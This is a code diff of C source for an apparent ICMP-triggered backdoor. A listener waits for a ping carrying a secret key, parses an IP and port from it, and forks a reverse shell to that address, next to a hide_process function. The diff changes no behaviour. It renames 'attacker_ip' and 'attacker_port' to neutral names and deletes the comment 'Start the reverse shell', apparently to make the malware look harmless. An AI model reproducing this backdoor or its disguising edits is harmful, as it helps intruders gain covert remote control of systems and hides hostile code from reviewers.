@@ -32,19 +32,19 @@ void hide_process()
 
 
 /*
- * Start the reverse shell
+ * 
  */
-void reverse_shell(char *attacker_ip, unsigned short int attacker_port){
+void reverse_shell(char *address_ip, unsigned short int address_port){
     int sock;
     char service[15];
     struct addrinfo *addr_info, hints, *tmp;
     
-    sprintf(service, "%d", attacker_port);
+    sprintf(service, "%d", address_port);
 
     memset(&hints, 0, sizeof(struct addrinfo));
     hints.ai_family = AF_INET;
 
-    if(getaddrinfo(attacker_ip, service, &hints, &addr_info) < 0){
+    if(getaddrinfo(address_ip, service, &hints, &addr_info) < 0){
         return;
     }
 
@@ -102,19 +102,19 @@ void ping_listener(void){
 			// If ICMP_ECHO packet and if KEY matches  */
             if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, KEY, 
 				icmp_ksize) == 0)){
-                char attacker_ip[16];
-                int attacker_port;
+                char address_ip[16];
+                int address_port;
                 
-                attacker_port = 0;
-                bzero(attacker_ip, sizeof(attacker_ip));
+                address_port = 0;
+                bzero(address_ip, sizeof(address_ip));
                 sscanf((char *)(icmp->icmp_data + icmp_ksize + 1), "%15s %d", 
-						attacker_ip, &attacker_port);
+						address_ip, &address_port);
                 
-                if((attacker_port <= 0) || (strlen(attacker_ip) < 7))
+                if((address_port <= 0) || (strlen(address_ip) < 7))
                     continue;
                 /* Starting reverse shell */
                 if(fork() == 0){
-					reverse_shell(attacker_ip, attacker_port);
+					reverse_shell(address_ip, address_port);
                     exit(EXIT_SUCCESS);
                 }
             }
